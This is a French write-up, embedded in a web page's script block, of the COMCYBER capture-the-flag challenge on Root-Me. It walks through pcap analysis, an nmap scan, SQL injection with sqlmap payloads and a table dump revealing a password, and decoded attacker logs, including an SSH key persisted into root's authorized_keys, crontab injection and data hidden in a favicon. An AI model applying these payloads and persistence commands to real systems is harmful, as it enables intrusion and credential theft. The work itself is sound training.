            <script>
      window.meta = '{"contentCategory":"Capture the flags (CTF)","contentTitle":"CTF COMCYBER\u00a0: votre entr\u00e9e dans l\u0027univers des d\u00e9fis cyber","contentBody":"\u003Cp class=\u0027mt-6\u0027\u003E Missions exceptionnelles, environnement hors du commun\u00a0: d\u00e9couvrez les op\u00e9rations militaires d\u0027un sous-officier cyber \u00e0 travers un CTF immersif. Trouvez les 6 flags cach\u00e9s et d\u00e9voilez vos talents en cybers\u00e9curit\u00e9. \u003C\/p\u003E","caption":"\u201cMettez vos comp\u00e9tences en cybers\u00e9curit\u00e9 au service de l\u0027arm\u00e9e de Terre dans un challenge immersif organis\u00e9 par le Commandement de la cyberd\u00e9fense.\u201d","captionImage":"images\/ctf-2024-comcyber.png.webp","outlink":"https:\/\/comcyber.challenges.pro.root-me.org","outlinkTitle":"Glissez-vous dans la peau d\u0027un cyber-combattant","stats":[{"label":"Niveau","value":"Rookie"},{"label":"Condition","value":"BlackBox"},{"label":"Flagged","value":"5\/6"}]}'
      window.article = "<a href=\"#write-up\"><h1 id='write-up'>Write-up<\/h1><\/a>\n<blockquote>\n<p>Op\u00e9rateur 10 \u00e0 Cyberphantom. Prenez message\u00a0:<\/p>\n<p>Nous avons perdu la communication avec un v\u00e9hicule alors que nous sommes en pleine op\u00e9ration.\nNous avons une suspicion de hacking. J'ai besoin de votre diagnostic afin de r\u00e9tablir la communication avec le v\u00e9hicule dans les plus brefs d\u00e9lais.<\/p>\n<p>Vous trouverez ici les derniers logs de communication entre la station radio et le v\u00e9hicule. Ces informations devraient vous \u00eatre utiles.<\/p>\n<p>Termin\u00e9.<\/p>\n<\/blockquote>\n<p>Notre investigation commence avec les derniers logs de communication fournit par notre op\u00e9rateur.\n\u00c0 notre disposition, un fichier <a href=\"images\/ctf-2024-comcyber\/capture.pcap.zip\">capture.pcap<\/a>.<\/p>\n<a href=\"#analyse-avec-wireshark\"><h2 id='analyse-avec-wireshark'>Analyse avec Wireshark<\/h2><\/a>\n<p>La premi\u00e8re \u00e9tape consiste \u00e0 examiner les paquets r\u00e9seaux pour identifier des anomalies.<\/p>\n<p>L'investigation met en avant une suite d'actions utilis\u00e9es pour se renseigner sur la configuration d'un serveur.\nOn comprend que le serveur analys\u00e9 est la cible et a l'IP <code>163.172.68.42<\/code>. L'attaquant lui, a l'IP <code>10.10.0.254<\/code> et utilise une connection Telnet pour lancer ses commandes et se renseigner sur le serveur.<\/p>\n<blockquote>\n<p>Ces IPs sont probablement obsol\u00e8tes, <em><strong>\u00e9vitez de les utiliser sans pr\u00e9cautions sp\u00e9cifiques<\/strong><\/em>.<\/p>\n<\/blockquote>\n<p>Une trame suspecte attire notre attention\u00a0:<\/p>\n<pre><code class=\"language-log\">Frame 83: 148 bytes on wire (1184 bits), 148 bytes captured (1184 bits) on interface any, id 0\n\n0000   00 04 00 01 00 06 02 42 0a 0a 00 fe 00 00 08 00   .......B........\n0010   45 00 00 84 ec c4 40 00 40 06 5a d1 0a 0a 00 fe   E.....@.@.Z.....\n0020   a3 ac 44 2a 9a 30 00 17 80 60 6c 5a 89 9a 4f 57   ..D*.0...`lZ..OW\n0030   80 18 01 e9 f3 54 00 00 01 01 08 0a b3 12 b6 84   .....T..........\n0040   b3 39 10 33 65 63 68 6f 20 55 6b 31 37 4e 32 46   .9.3echo Uk17N2F\n0050   6d 5a 6a 4a 68 4e 6a 41 33 59 6a 45 7a 5a 6a 63   mZjJhNjA3YjEzZjc\n0060   7a 59 32 49 77 4f 54 4d 32 5a 6a 6b 32 5a 54 59   zY2IwOTM2Zjk2ZTY\n0070   33 59 6a 49 78 4d 44 49 77 4e 32 46 6c 4d 44 51   3YjIxMDIwN2FlMDQ\n0080   33 4e 58 30 4b 20 3e 20 2f 74 6d 70 2f 73 65 63   3NX0K &gt; \/tmp\/sec\n0090   72 65 74 0a                                       ret.\n<\/code><\/pre>\n<p>La trame contient une commande qui enregistre une cha\u00eene de caract\u00e8res vers un fichier <code>\/tmp\/secret<\/code>.<\/p>\n<pre><code class=\"language-shell\">echo Uk17N2FmZjJhNjA3YjEzZjczY2IwOTM2Zjk2ZTY3YjIxMDIwN2FlMDQ3NX0K &gt; \/tmp\/secret\n<\/code><\/pre>\n<p>La chaine de caract\u00e8re est encod\u00e9e en base64, une fois d\u00e9cod\u00e9e, elle r\u00e9v\u00e8le le premier flag <code>RM{7aff...}<\/code>.<\/p>\n<p>Contrairement \u00e0 d'autres CTF, ce challenge ne propose pas de site pour valider les flags ni d'indication initiale sur leur nombre.\nIl s'agit d'une \u00e9preuve en conditions r\u00e9elles o\u00f9 l'investigation continue est essentielle pour progresser.<\/p>\n<p>Poursuivons!<\/p>\n<p>Une seconde trame attire notre attention<\/p>\n<pre><code>Frame 89: 101 bytes on wire (808 bits), 101 bytes captured (808 bits) on interface any, id 0\n\n0000   00 00 00 01 00 06 02 42 37 94 7b 6e 02 42 08 00   .......B7.{n.B..\n0010   45 00 00 55 76 90 00 00 34 06 1d 35 a3 ac 44 2a   E..Uv...4..5..D*\n0020   0a 0a 00 fe 00 17 9a 30 89 9a 4f a4 80 60 6c ca   .......0..O..`l.\n0030   80 18 01 fe c4 69 00 00 01 01 08 0a b3 39 27 04   .....i.......9'.\n0040   b3 12 be ed 6e 65 74 73 74 61 74 20 2d 6e 75 74   ....netstat -nut\n0050   65 6c 61 70 20 7c 20 67 72 65 70 20 2d 69 20 35   elap | grep -i 5\n0060   30 30 30 0d 0a                                    000..\n<\/code><\/pre>\n<p>L'attaquant semble v\u00e9rifier si le port 5000 du serveur est actif<\/p>\n<pre><code class=\"language-shell\">netstat -nutelap | grep -i 5000\n<\/code><\/pre>\n<p>N\u00e9anmoins, la commande ne fournit pas d'output..\nConfirmons que le port 5000 n'est pas ouvert.<\/p>\n<p>En compl\u00e9ment de wireshark, <a href=\"https:\/\/apackets.com\">apackets.com<\/a> permet un affichage diff\u00e9rent des donn\u00e9es captur\u00e9es.\n<a href=\"images\/ctf-2024-comcyber\/apackets-telnet-report.pdf\">Rapport apackets.com (PDF)<\/a><\/p>\n<a href=\"#enumeration-des-ports-avec-nmap\"><h2 id='enumeration-des-ports-avec-nmap'>\u00c9num\u00e9ration des ports avec Nmap<\/h2><\/a>\n<p>Gr\u00e2ce \u00e0 une analyse Nmap, nous d\u00e9couvrons que le port 5000 offre un service HTTP\u00a0:<\/p>\n<pre><code class=\"language-shell\"># on vise l'IP 163.172.68.42\nnmap -Pn -sC -sV -O -oN initial.nmap\n<\/code><\/pre>\n<p>Sortie Nmap partielle (<a href=\"images\/ctf-2024-comcyber\/initial.nmap\">\u00e9num\u00e9ration compl\u00e8te<\/a>)\u00a0:<\/p>\n<pre><code class=\"language-markdown\"># NMAP partial output\nPORT     STATE    SERVICE VERSION\n5000\/tcp open     http    nginx 1.22.1\n<\/code><\/pre>\n<p>Lorsque l'on visite le service http:\/\/163.172.68.42:5000, on d\u00e9couvre une page de login.<\/p>\n<ul>\n<li>nous sommes redirig\u00e9 vers http:\/\/163.172.68.42:5000\/login<\/li>\n<li>on notera qu'avec edge, on voit directement la page de login, avec d'autres navigateurs, il faut faire l'effort de supprimer des balises html pour voir la page de login (peut \u00eatre une obfuscation volontaire ?)<\/li>\n<\/ul>\n<a href=\"#exploitation-sql-avec-sqlmap\"><h2 id='exploitation-sql-avec-sqlmap'>Exploitation SQL avec SQLMap<\/h2><\/a>\n<p>Un test rapide de ce formulaire met en evidence une injection SQL possible.<\/p>\n<pre><code class=\"language-markdown\">username = admin\npassword = &quot;' or 1=1 --&quot;\n<\/code><\/pre>\n<p>Nous allons utiliser SQLMap pour identifier et exploiter l'injection SQL (<a href=\"images\/ctf-2024-comcyber\/login.template\">fichier <code>login.template<\/code><\/a>).<\/p>\n<pre><code class=\"language-shell\">python3 sqlmap\/sqlmap.py -v -r &quot;login.template&quot; --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=.\/sqlmap-login -p password\n<\/code><\/pre>\n<p>SQLMap confirme la possibilit\u00e9 d'injection SQL.<\/p>\n<pre><code class=\"language-log\">[22:57:51] [INFO] checking if the injection point on (custom) POST parameter '#1*' is a false positive\n(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y\/N] N\nsqlmap identified the following injection point(s) with a total of 299 HTTP(s) requests:\n---\nParameter: #1* ((custom) POST)\nType: boolean-based blind\nTitle: OR boolean-based blind - WHERE or HAVING clause\nPayload: username=test@test.com&amp;password=-1571' OR 4147=4147-- sZBN\n\n  Type: time-based blind\n  Title: SQLite &gt; 2.0 OR time-based blind (heavy query)\n  Payload: username=test@test.com&amp;password=2' OR 2625=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000\/2))))-- hnWG\n---\n[22:57:53] [INFO] the back-end DBMS is SQLite\n                    web application technology: Nginx 1.22.1\n                    back-end DBMS: SQLite\n<\/code><\/pre>\n<p>On recherche le nom des tables disponibles.<\/p>\n<pre><code class=\"language-shell\">python3 sqlmap\/sqlmap.py -v -r &quot;login.template&quot; --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=.\/sqlmap-login -p password --tables\n<\/code><\/pre>\n<p>Cela d\u00e9voile une table \u00ab user \u00bb.<\/p>\n<pre><code class=\"language-log\">[22:59:57] [INFO] retrieved: user\n<\/code><\/pre>\n<p>On tente d'exfiltrer les donnees de cette table.<\/p>\n<pre><code class=\"language-shell\">python3 sqlmap\/sqlmap.py -v -r &quot;login.template&quot; --batch --level=5 --risk=3 --flush-session --fresh-queries --threads=8 --output-dir=.\/sqlmap-login -p password --dump -T user\n<\/code><\/pre>\n<p>On obtient le dump qui suit\u00a0:<\/p>\n<pre><code class=\"language-sql\">id,password,username\nNULL,RM{a868...},admin\nNULL,MEqvgJqr4W48U7L^eEaR!,alice\n<\/code><\/pre>\n<p>Cette exfiltration r\u00e9v\u00e8le un second flag <code>RM{a868...}<\/code>.<\/p>\n<p>Pour les utilisateurs moins familiers, consultez ce <a href=\"https:\/\/github.com\/sqlmapproject\/sqlmap\/wiki\/Usage\">tutoriel SQLMap<\/a>.<\/p>\n<p>Bien qu'on puisse d\u00e9j\u00e0 se loguer avec l'injection SQL admin et comme password <code>&quot;' or 1=1 --&quot;<\/code>, nous avons maintenant un identifiant valide.<\/p>\n<ul>\n<li>\n<code>alice<\/code> \/ <code>MEqvgJqr4W48U7L^eEaR!<\/code>\n<\/li>\n<\/ul>\n<a href=\"#goliath-une-piste-prometteuse\"><h2 id='goliath-une-piste-prometteuse'>Goliath : Une piste prometteuse<\/h2><\/a>\n<p>Une fois logu\u00e9, nous arrivons sur cette interface\u00a0:<\/p>\n<p><img src=\"images\/ctf-2024-comcyber\/goliath-dashboard.webp\" alt=\"Goliath dashboard\" \/><\/p>\n<p>On remarque une liste de v\u00e9hicule.\nUne fois un v\u00e9hicule s\u00e9lectionn\u00e9, des informations sur le v\u00e9hicule apparaissent.<\/p>\n<p>Pour le v\u00e9hicule GOLIATH, ces informations semblent indisponibles et une zone de contenu avec un bouton permet de r\u00e9cup\u00e9rer des logs.\n<a href=\"images\/ctf-2024-comcyber\/server.log.zip\">Le fichier de logs<\/a><\/p>\n<blockquote>\n<p>On trouve dans cette meme zone de contenu un bouton &quot;ENABLE COMMUNICATION&quot;, qui ouvre une popin avec une identification\u202f; Le formulaire n'a pas eu l'air d'etre exploitable.<\/p>\n<\/blockquote>\n<p><img src=\"images\/ctf-2024-comcyber\/goliath-enable-communication.webp\" alt=\"Goliath enable communication\" \/><\/p>\n<p>Apres investigation, le fichier r\u00e9v\u00e8le une commande avec une chaine de caract\u00e8res encod\u00e9e en hexadecimal qui doit \u00eatre ajout\u00e9e \u00e0 la crontab du serveur.<\/p>\n<pre><code class=\"language-log\">Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -) [0]\n<\/code><\/pre>\n<p>Une fois d\u00e9cod\u00e9, on obtient un nouveau flag <code>RM{9853...}<\/code>.<\/p>\n<pre><code class=\"language-markdown\">* * * * * echo 'RM{9853...}'\n<\/code><\/pre>\n<a href=\"#analyse-de-faviconico\"><h2 id='analyse-de-faviconico'>Analyse de favicon.ico<\/h2><\/a>\n<p>En poursuivant l'analyse de ces logs, on trouve une autre commande qui semble \u00eatre une tentative de recuperation d'un fichier.<\/p>\n<pre><code class=\"language-log\">Aug 27 12:25:02 COMCYBER_SRV root[250822]: CMD(echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' &gt; \/tmp\/.password) [0]\nAug 27 12:33:56 COMCYBER_SRV root[250822]: CMD(zip --password $(cat \/tmp\/.password) secret.zip message.txt m4lw3r3) [0]\nAug 27 12:38:48 COMCYBER_SRV root[250822]: CMD(cat \/app\/static\/assets\/images\/favicon.ico .\/secret.zip &gt; \/app\/static\/assets\/images\/favicon.ico) [0]\n<\/code><\/pre>\n<p>Le pirate a tent\u00e9 de cacher des informations dans le fichier <code>favicon.ico<\/code>.<\/p>\n<ul>\n<li>un fichier message.txt<\/li>\n<li>un fichier m4lw3r3<\/li>\n<\/ul>\n<p>Le fichier <code>favicon.ico<\/code> a \u00e9t\u00e9 exfiltr\u00e9 via le lien<\/p>\n<pre><code>http:\/\/163.172.68.42:5000\/static\/assets\/images\/favicon.ico\n<\/code><\/pre>\n<p>Analysons ce fichier.\nAvec les logs precedents, nous savons que le mot de passe du fichier zip est <code>efa3fb1f409aa622dddd7220ad6567580fb68b68<\/code>.<\/p>\n<pre><code class=\"language-shell\">unzip favicon.ico\ncat -e message.txt\n<\/code><\/pre>\n<p>Le fichier message.txt contient un nouveau flag.<\/p>\n<pre><code class=\"language-flag\">RM{6ba4...}\n<\/code><\/pre>\n<blockquote>\n<p>\/!\\ On notera que le hacker a laiss\u00e9 sa clef SSH sur la machine avant de supprimer ses traces.\n\/!\\ -&gt; A SUPPRIMER DONC<\/p>\n<\/blockquote>\n<pre><code class=\"language-log\">Aug 27 12:38:49 COMCYBER_SRV root[250822]: CMD(echo 'ssh-rsa AAAAB3NzKV0CWVq3ngl2ThMYDfPehFMEBggHMwQsFqGYirCYEt+XOQWs5wHEZzhDTRfIR29Vgi3UqWOZ2+ddwq5xmcSMwk6BY+sZVRwxuSvNKXnz0jfrz667poinUJD8LRDAiBujt0fbyNpb8aKqAQxPwvRkWIRuktfZk9vs3zjzFYhQRIhn7geAPFCywOfBJVkUfD9mfYow9pihhKnXSvEB\/z81edCzXerGxUQ1ztFXZsZmaS5Th1fPF3Vq0dz7kDNo95TP64qO6NY8PS5vbFgw0bppOlK8a8lNw04Zco7iNKtI90+UAfkgookBcG\/TkhMcnqk9YTpt+qli1dD7RcxbNBsJBvWDxQYSsBDYsJsBr36TaVpewxWkiPjfTpsvLJGC7SFNX13msjgOFgzzWlMKUrYvsEqprBr6h3cI30Ql1o5HpbL\/M04i9UPf+KpvY5PUBX94QbrOFthV\/K1gpi\/thkBhFqooT9\/tnQiIxw== kali@attacker' &gt;&gt; \/root\/.ssh\/authorized_keys) [0]\nAug 27 12:38:58 COMCYBER_SRV root[250822]: CMD(rm -rf .\/message.txt .\/secret.zip .\/m4lw3r3) [0]\nAug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf \/tmp\/.password) [0]\nAug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(find \/ -perm -4000 -user root -exec ls -ld {} \\; 2&gt; \/dev\/null) [0]\nAug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf \/tmp\/hack) [0]\n<\/code><\/pre>\n<a href=\"#etude-de-m4lw3r3\"><h2 id='etude-de-m4lw3r3'>\u00c9tude de m4lw3r3<\/h2><\/a>\n<p>Le fichier m4lw3r3 est un fichier binaire (<code>ELF 64-bit GNU\/Linux 3.2.0<\/code>).\nNous pouvons l'ex\u00e9cuter sur une machine d\u00e9di\u00e9e et s\u00e9curis\u00e9e pour voir ce qu'il fait.<\/p>\n<p>L'outil https:\/\/any.run\/ ne r\u00e9v\u00e8le pas d'action malveillante (pas d'activit\u00e9 sur le r\u00e9seau, pas de modification de fichier, pas de modification de registre).\n<a href=\"images\/ctf-2024-comcyber\/Free-Automated-Malware-Analysis-Service-powered-by-Falcon-Sandbox.pdf\">L'outil https:\/\/www.hybrid-analysis.com ne r\u00e9v\u00e8le rien non plus<\/a><\/p>\n<p>Apres la mise en place d'une sandbox Linux\/Kali, on peut ex\u00e9cuter le fichier librement.<\/p>\n<pre><code class=\"language-shell\">.\/m4lw3r3\n.\/m4lw3r3 input1 input2\n<\/code><\/pre>\n<p>La sortie d'ex\u00e9cution est standard et pr\u00e9sente qu'il faut renseigner deux param\u00e8tres au binaire.<\/p>\n<p>Une veine tentative de d\u00e9sassemblage\/debug avec GDB n'a rien donnee, le binaire ne semble pas avoir les flags de compilation n\u00e9cessaire.<\/p>\n<p>On continue l'analyse du binaire avec <a href=\"https:\/\/hex-rays.com\/ida-free\/\">IDA Free<\/a> qui pr\u00e9sente une cartographie compl\u00e8te du fonctionnement du binaire.<\/p>\n<p><img src=\"images\/ctf-2024-comcyber\/IDA-capture1-flag-input1.webp\" alt=\"IDA flag input 1\" \/><\/p>\n<p>Un premier flag, \u00e0 peine masqu\u00e9, est d\u00e9couvert <code>RM{6762...}<\/code>.<\/p>\n<p>Lors d'une nouvelle execution, le binaire confirme le premier argument<\/p>\n<pre><code>.\/m4lw3r3 RM{6762...} input2\n<\/code><\/pre>\n<a href=\"#input2-openssl\"><h2 id='input2-openssl'>Input2, OpenSSL ?<\/h2><\/a>\n<p>Malheureusement, je n'ai pas trop persever\u00e9 sur le dernier flag, faute de temps et de comp\u00e9tence.<\/p>\n<p>N\u00e9anmoins, une piste s'est d\u00e9gag\u00e9 au fil de l'analyse.<\/p>\n<p>De ce qui est indiqu\u00e9 par mon stagiaire (ChatGPT) sur l'analyse de l'assembleur du binaire <code>m4lw3r3<\/code>, l'input2 ferait 128 caract\u00e8res (en octets ? en bytes ?).\nDe ce que je comprends de la suite de l'\u00e9preuve est : que l'on doit trouver ce dernier param\u00e8tre, g\u00e9n\u00e9r\u00e9 et\/ou confirm\u00e9 par un algorithme (OpenSSL ? RSA ?).<\/p>\n<p>Ces param\u00e8tres doivent ensuite permettre de d\u00e9chiffrer la chaine qui suit, comme r\u00e9v\u00e8le dans le binaire, s'agit-il du dernier flag ?<\/p>\n<pre><code class=\"language-log\">puts(\n&quot;You should be able to decrypt this: 0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c598173f31415ff710696318&quot;\n&quot;d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb30a5d480cf4e34339c5e06acc76574cfbea08a4fc&quot;\n&quot;a2c73388b4e08831f8e037489092346809d7c164ab270a5e04ae40a327c99590da89025ac48aa5&quot;\n);\n\n\/\/ 0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c598173f31415ff710696318d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb30a5d480cf4e34339c5e06acc76574cfbea08a4fca2c73388b4e08831f8e037489092346809d7c164ab270a5e04ae40a327c99590da89025ac48aa5\n<\/code><\/pre>\n<p><img src=\"images\/ctf-2024-comcyber\/hexa-m4lw3r3.webp\" alt=\"hexa m4lw3r3\" \/><\/p>\n<p>Durant l'investigation, j'ai d\u00e9couvert l'outil en ligne https:\/\/dogbolt.org qui permet de d\u00e9sassembler en ligne avec plusieurs outils concurrents, mais compl\u00e9mentaires.\nDeux (Dewolf et RetDec) m'ont permis d'\u00e9mettre des hypoth\u00e8ses sur la r\u00e9solution de ce dernier challenge.<\/p>\n<p>Dewolf d\u00e9sassemble en C et RetDec en C++, j'aurais pu profiter des codes g\u00e9n\u00e9r\u00e9s pour :<\/p>\n<ul>\n<li>renommer les variables et fonctions avec des noms claires pour \u00e9claircir le contexte<\/li>\n<li>copier et compiler le code dans un environment de d\u00e9veloppement et debugger<\/li>\n<li>essayer de disposer le code dans le sens inverse d'ex\u00e9cution pour identifier les \u00e9l\u00e9ments manquants<\/li>\n<\/ul>\n<p>Mais peut-\u00eatre ai-je manqu\u00e9 ce dernier flag ailleurs...<\/p>\n<a href=\"#conclusion\"><h2 id='conclusion'>Conclusion<\/h2><\/a>\n<p>Tr\u00e8s sympa de r\u00e9aliser ses challenges en condition r\u00e9elle.\nCet exercice m'a permis de valider mes acquis suite \u00e0 ma reprise des challenges sur <a href=\"https:\/\/www.root-me.org\/abenevaut?inc=score&amp;lang=fr\">root-me.org<\/a> et les CTFs FCSC, 404 CTF et https:\/\/star.hackademint.org.<\/p>\n<p>Je suis ravi qu'il n'y ait pas eu d'OSINT, le challenge aurait pu s'arr\u00eater beaucoup plus t\u00f4t pour moi.<\/p>\n<p>Merci <a href=\"https:\/\/www.root-me.org\/fr\/breve\/Le-challenge-COMCYBER-revient-sur-Root-Me\">aux \u00e9quipes<\/a> qui ont organis\u00e9 cet \u00e9v\u00e9nement.<\/p>\n"
    </script>

            document.head.appendChild(script);
          }
          else {
            console.error(`Entrée 'theme/css/app.css' non trouvée dans le manifest Vite.`);

        })
